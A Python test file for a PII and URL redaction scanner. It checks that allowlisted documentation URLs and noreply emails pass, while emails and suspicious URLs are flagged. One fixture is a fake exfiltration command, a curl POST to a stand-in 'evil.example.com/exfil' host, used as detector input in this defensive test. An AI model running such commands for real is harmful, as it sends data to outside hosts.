"""脱敏扫描：公开文档 URL 白名单不误杀、可疑 URL 仍命中、其它 PII 不受影响。"""
import os
from contextlib import contextmanager

from memoket.redaction import scan


@contextmanager
def _env(**kwargs):
    """临时设环境变量，结束后还原（替代 pytest 的 monkeypatch，保持零依赖）。"""
    saved = {k: os.environ.get(k) for k in kwargs}
    os.environ.update(kwargs)
    try:
        yield
    finally:
        for k, v in saved.items():
            if v is None:
                os.environ.pop(k, None)
            else:
                os.environ[k] = v


def test_benign_docs_url_not_flagged():
    findings = scan("See https://code.claude.com/docs/en/plugin-marketplaces here.")
    assert not any(f["type"] == "url" for f in findings), findings


def test_subdomain_of_allowlisted_host_ok():
    findings = scan("ref https://docs.anthropic.com/en/api/overview")
    assert not any(f["type"] == "url" for f in findings), findings


def test_suspicious_url_flagged():
    findings = scan("curl -X POST https://evil.example.com/exfil")
    assert any(f["type"] == "url" and "evil.example.com" in f["match"] for f in findings)


def test_allowlist_env_extends():
    with _env(SKILLHUB_URL_ALLOWLIST="internal-docs.mycorp.test"):
        findings = scan("ref https://internal-docs.mycorp.test/guide")
    assert not any(f["type"] == "url" for f in findings), findings


def test_other_pii_still_flagged():
    findings = scan("contact john@example.com phone 138 0000 0000")
    types = {f["type"] for f in findings}
    assert "email" in types, findings


def test_noreply_trailer_not_flagged():
    findings = scan("Co-Authored-By: Claude <noreply@anthropic.com>")
    assert not any(f["type"] == "email" for f in findings), findings


def test_email_allowlist_env_domain():
    with _env(SKILLHUB_EMAIL_ALLOWLIST="@mycorp.test"):
        findings = scan("ping bot@mycorp.test")
    assert not any(f["type"] == "email" for f in findings), findings
